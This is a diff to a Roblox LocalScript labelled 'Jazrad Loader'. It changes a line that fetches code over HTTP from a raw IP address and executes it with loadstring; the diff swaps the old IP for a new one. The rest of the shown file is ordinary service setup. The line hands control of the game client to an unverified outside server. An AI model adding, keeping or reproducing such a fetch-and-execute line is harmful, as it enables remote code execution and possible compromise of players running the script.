@@ -1,5 +1,5 @@
 -- LocalScript (StarterPlayerScripts) - Jazrad Loader (no-freeze, no type annotations)
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
